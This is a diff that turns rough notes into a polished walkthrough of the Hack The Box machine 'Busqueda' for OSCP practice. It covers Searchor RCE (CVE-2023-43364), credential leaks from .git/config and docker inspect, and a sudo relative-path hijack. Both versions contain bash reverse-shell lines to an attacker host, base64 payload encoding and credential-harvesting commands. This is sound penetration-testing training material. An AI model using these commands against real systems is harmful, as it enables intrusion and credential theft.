@@ -1,126 +1,214 @@
+# Busqueda — HTB (TJ Null OSCP List)
+
+| Detail       | Value                          |
+|--------------|--------------------------------|
+| **IP**       | 10.129.228.217                 |
+| **Hostname** | searcher.htb                   |
+| **OS**       | Linux                          |
+| **Difficulty** | Easy                         |
+| **Key Skills** | CVE exploitation, Git credential leakage, Docker inspection, Sudo path hijack |
+
+---
+
+## 1. Enumeration
+
+### Virtual Host
+```
 10.129.228.217 -> searcher.htb
+```
+Add to `/etc/hosts`.
 
-found Searchor 2.4.0 in the page source of the application 
+### Web Application Fingerprinting
+- Page source reveals **Searchor 2.4.0**
+- This version is vulnerable to **CVE-2023-43364** — Remote Code Execution via unsanitized `eval()` in the search query handler
 
-found a exploit on the following version "CVE-2023-43364-"
+---
 
-https://github.com/Herick-Costa/CVE-2023-43364-Searchor-RCE-Exploit 
+## 2. Initial Foothold — CVE-2023-43364 (Searchor RCE)
 
+**Vulnerability:** Searchor 2.4.0 passes user input directly into Python `eval()`, allowing arbitrary command execution.
+
+### Confirm RCE
+```bash
 python CVE-2023-43364.py http://searcher.htb/search -a "id"
-[*] Executando comando custom: id
-uid=1000(svc) gid=1000(svc) groups=1000(svc)
+# uid=1000(svc) gid=1000(svc) groups=1000(svc)
+```
 
-echo -n "bash -i >& /dev/tcp/10.10.14.4/9001 0>&1" | base64
-YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ==
+### Reverse Shell
+```bash
+# Encode payload to avoid bad characters
+echo -n "bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1" | base64
 
-python CVE-2023-43364.py http://searcher.htb/search -a "echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ==" | base64 -d | bash"
+# Execute via CVE exploit
+python CVE-2023-43364.py http://searcher.htb/search -a \
+  'echo "<BASE64_PAYLOAD>" | base64 -d | bash'
+```
 
-Got the reverse shell 
+> **OSCP Technique — Base64 shell encoding:**
+> When injecting reverse shells through exploits that mangle special characters (`>`, `&`, `|`), base64-encode the payload and pipe through `base64 -d | bash`. This bypasses most character filtering.
 
-found a .git in the same folder after the reverse shell by using the "ls -la"
+**Shell as:** `svc`
 
-ls -la
-total 20
-drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 .
-drwxr-xr-x 4 root     root     4096 Apr  4  2023 ..
--rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
-drwxr-xr-x 8 www-data www-data 4096 Oct 29 10:21 .git
+---
 
-found the cred's of the current user as cody and it revels there is a another services running 
+## 3. Post-Exploitation Enumeration — Git Credential Leak
 
-svc@busqueda:/var/www/app/.git$ ls
-ls
-branches        config       HEAD   index  logs     refs
-COMMIT_EDITMSG  description  hooks  info   objects
-svc@busqueda:/var/www/app/.git$ cat config
-cat config
-[core]
-	repositoryformatversion = 0
-	filemode = true
-	bare = false
-	logallrefupdates = true
-[remote "origin"]
-	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
-	fetch = +refs/heads/*:refs/remotes/origin/*
-[branch "main"]
-	remote = origin
-	merge = refs/heads/main
+### Finding the .git directory
+```bash
+ls -la /var/www/app/
+# .git directory present
+```
 
+### Extracting credentials from Git config
+```bash
+cat /var/www/app/.git/config
+```
+The `[remote "origin"]` URL contains **embedded credentials**:
+```
+http://cody:<PASSWORD>@gitea.searcher.htb/cody/Searcher_site.git
+```
 
-By using the cred's found this 
+> **OSCP Technique — Git credential harvesting:**
+> Always check `.git/config` for hardcoded credentials in remote URLs. Developers frequently embed creds in `http://user:pass@host` format. Also check:
+> - `.git/config` — remote URLs with embedded creds
+> - `.git-credentials` — plaintext credential store
+> - `.gitconfig` — user-level config
+> - Commit history (`git log -p`) — passwords in old commits
 
+### Credential Reuse
+The password from the Git config also works as the `svc` user's system password (credential reuse).
+
+---
+
+## 4. Privilege Escalation — Sudo + Docker Inspect + Path Hijack
+
+### Step 1: Check sudo permissions
+```bash
 sudo -l
-[sudo] password for svc: jh1usoih2bkjaspwe92
+# (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+```
+The wildcard `*` means we control the arguments passed to the script.
 
-Matching Defaults entries for svc on busqueda:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
-    use_pty
+### Step 2: Enumerate the script's capabilities
+```bash
+sudo python3 /opt/scripts/system-checkup.py help
+# docker-ps      : List running docker containers
+# docker-inspect : Inspect a certain docker container
+# full-checkup   : Run a full system checkup
+```
 
-User svc may run the following commands on busqueda:
-    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+### Step 3: Extract secrets via Docker inspect
+```bash
+sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea
+```
+Leaked environment variables from the Gitea container:
+```
+GITEA__database__HOST=db:3306
+GITEA__database__NAME=gitea
+GITEA__database__USER=gitea
+GITEA__database__PASSWD=<DB_PASSWORD>
+```
 
-found that its runs some docker images 
+> **OSCP Technique — Docker inspect for secrets:**
+> `docker inspect` dumps the full container config including env vars. Databases, API keys, and internal service passwords are almost always in env vars. Format templates help extract specific fields:
+> ```bash
+> docker inspect --format='{{json .Config.Env}}' <container>
+> docker inspect --format='{{json .NetworkSettings}}' <container>
+> ```
 
-sudo python3 /opt/scripts/system-checkup.py lrr
-Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
+### Step 4: Access the database (optional lateral path)
+```bash
+mysql -h 127.0.0.1 -u gitea -p<DB_PASSWORD>
+```
+```sql
+SHOW DATABASES;
+USE gitea;
+SHOW TABLES;
+SELECT * FROM user;
+```
 
-     docker-ps     : List running docker containers
-     docker-inspect : Inpect a certain docker container
-     full-checkup  : Run a full system checkup
+### Step 5: Root via relative path hijack in `full-checkup`
+The `system-checkup.py` script calls `full-checkup.sh` using a **relative path** (not absolute). By creating our own `full-checkup.sh` in the current directory, it gets executed as root.
 
-
-after running this command 
-
-got this info in the Gitea image "sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea"
-
-TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gsitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh"
-
-Connecting the the mysql using the Gitea 
-
-mysql -h 127.0.0.1 -u gitea -pyuiu1hoiu4i5ho1uh
-
-mysql commands 
-
-show databases;
-select database;
-show tables;
-select * from user;
-
-created a file called fuul-checkup.sh
-
-cat full-checkup.sh 
+```bash
+# Create malicious full-checkup.sh in current directory
+cat > full-checkup.sh << 'EOF'
 #!/bin/bash
-bash -c 'bash -i >& /dev/tcp/10.10.14.4/9002 0>&1'
+bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/9002 0>&1'
+EOF
 
-pulled the file into the machine 
-
-ran 
-
-wget http://10.10.14.4:8080/full-checkup.sh
-wget http://10.10.14.4:8080/full-checkup.sh
---2026-10-29 11:48:51--  http://10.10.14.4:8080/full-checkup.sh
-Connecting to 10.10.14.4:8080... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 63 [text/x-sh]
-Saving to: ‘full-checkup.sh’
-
-full-checkup.sh     100%[===================>]      63  --.-KB/s    in 0s      
-
-2026-10-29 11:48:51 (8.15 MB/s) - ‘full-checkup.sh’ saved [63/63]
-
-svc@busqueda:~$ ls
-ls
-full-checkup.sh  user.txt
-svc@busqueda:~$ chmod +x full-checkup.sh
 chmod +x full-checkup.sh
-svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
-<python3 /opt/scripts/system-checkup.py full-checkup
 
+# Trigger it via sudo — runs OUR script as root
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+```
 
-got the root shell
+> **OSCP Technique — Relative path hijack with sudo:**
+> When a sudo-allowed script calls another script/binary by **relative path** (e.g., `./full-checkup.sh` instead of `/opt/scripts/full-checkup.sh`), you can hijack it:
+> 1. Create a malicious file with the same name in your writable CWD
+> 2. Make it executable
+> 3. Run the sudo command from that directory
+>
+> The script resolves the relative path from CWD, executing your payload as root.
 
+**Shell as:** `root`
 
+---
 
+## 5. Attack Chain Summary
 
+```
+Searchor 2.4.0 (CVE-2023-43364 RCE)
+    |
+    v
+Shell as svc
+    |
+    v
+.git/config credential leak --> cody's password --> reused for svc sudo
+    |
+    v
+sudo system-checkup.py --> docker-inspect --> DB creds (lateral)
+    |
+    v
+sudo system-checkup.py full-checkup --> relative path hijack --> root
+```
 
+---
+
+## 6. OSCP Exam Takeaways
+
+| Lesson | Detail |
+|--------|--------|
+| **Always check app version** | Page source, headers, `/about`, footer — then search for CVEs |
+| **Base64 encode reverse shells** | Avoids character mangling in exploit payloads |
+| **Hunt for .git in webroot** | `ls -la` every directory after landing — `.git` is a goldmine |
+| **Git remotes leak creds** | `cat .git/config` — look for `http://user:pass@` URLs |
+| **Try credential reuse everywhere** | Same password for system login, DB, other services |
+| **Docker inspect = secret dump** | Env vars in containers often hold DB passwords, API keys |
+| **Relative path in sudo = hijack** | If a sudo script calls something by relative path, you control it from CWD |
+
+---
+
+## 7. Commands Quick Reference
+
+```bash
+# CVE RCE
+python CVE-2023-43364.py http://searcher.htb/search -a "id"
+
+# Base64 reverse shell
+echo -n "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1" | base64
+echo "BASE64" | base64 -d | bash
+
+# Git cred leak
+cat .git/config
+git log -p  # check commit history too
+
+# Docker inspect
+sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea
+
+# Path hijack
+echo '#!/bin/bash' > full-checkup.sh
+echo 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' >> full-checkup.sh
+chmod +x full-checkup.sh
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+```
